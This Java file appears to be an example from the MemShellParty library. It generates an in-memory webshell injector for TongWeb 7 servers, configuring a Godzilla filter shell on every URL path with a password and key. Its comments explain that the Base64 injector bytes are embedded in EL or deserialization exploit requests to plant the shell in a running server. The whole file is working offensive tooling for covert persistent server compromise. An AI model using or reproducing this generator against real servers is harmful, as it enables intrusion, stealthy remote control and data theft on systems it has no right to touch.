package com.reajason.javaweb.examples.tongweb;

import com.reajason.javaweb.Server;
import com.reajason.javaweb.memshell.MemShellGenerator;
import com.reajason.javaweb.memshell.MemShellResult;
import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.config.ShellToolConfig;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaConfig;

import java.util.HashMap;
import java.util.Map;

/**
 * Mirrors how TongWebExploit generates a TongWeb memshell injector with MemShellParty.
 *
 * <p>The injector class bytes are what an exploit embeds into an EL / deserialization
 * payload (usually Base64) to plant the shell into a running TongWeb server.
 *
 * @author ReaJason
 * @since 3.0.0
 */
public class TongWebMemShellExample {

    public static void main(String[] args) {
        MemShellResult result = generateWithTypedConfig("pass", "key");
        print("typed builder", result);

        MemShellResult dynamic = generateWithParams("Godzilla", "Filter", "pass", "key");
        print("dynamic params", dynamic);
    }

    /**
     * 2.x-style flow with typed builders, still the most readable option when the
     * set of supported tools is fixed at build time.
     *
     * <p>2.x → 3.x difference: tool config classes moved from
     * {@code com.reajason.javaweb.memshell.config} into their shell-tool modules,
     * e.g. {@code com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaConfig}.
     */
    public static MemShellResult generateWithTypedConfig(String pass, String key) {
        ShellConfig shellConfig = ShellConfig.builder()
                .server(Server.TongWeb)
                .serverVersion("7")
                .shellTool(ShellTool.Godzilla)
                .shellType(ShellType.FILTER)
                .shrink(true)
                .debug(false)
                .probe(false)
                .lambdaSuffix(false)
                .jakarta(false)
                .byPassJavaModule(false)
                .build();

        InjectorConfig injectorConfig = InjectorConfig.builder()
                .urlPattern("/*")
                .staticInitialize(false)
                .build();

        GodzillaConfig godzillaConfig = GodzillaConfig.builder()
                .pass(pass)   // blank values keep the random default
                .key(key)
                .build();

        return new MemShellGenerator().generate(shellConfig, injectorConfig, godzillaConfig);
    }

    /**
     * 3.x dynamic flow: raw UI strings go straight into the Map overload of
     * {@link MemShellGenerator#generate}, which binds them to the tool's config
     * builder (replacing the per-tool if/else chain and the compile-time dependency
     * on every tool's config class). Unknown or blank params fall back to defaults.
     */
    public static MemShellResult generateWithParams(String shellTool, String shellType, String pass, String key) {
        ShellConfig shellConfig = ShellConfig.builder()
                .server(Server.TongWeb)
                .serverVersion("7")
                .shellTool(shellTool)
                .shellType(shellType)
                .shrink(true)
                .build();

        InjectorConfig injectorConfig = InjectorConfig.builder()
                .urlPattern("/*")
                .build();

        Map<String, String> params = new HashMap<>();
        params.put("pass", pass);
        params.put("key", key);

        return new MemShellGenerator().generate(shellConfig, injectorConfig, params);
    }

    private static void print(String mode, MemShellResult result) {
        System.out.println("[" + mode + "]");
        System.out.println("  injector class : " + result.getInjectorClassName());
        System.out.println("  shell class    : " + result.getShellClassName());
        System.out.println("  injector bytes : " + result.getInjectorSize() + " B");
        System.out.println("  shell bytes    : " + result.getShellSize() + " B");
        // this Base64 string is what a payload builder embeds into the exploit request
        System.out.println("  injector b64   : " + result.getInjectorBytesBase64Str().length() + " chars");
    }
}
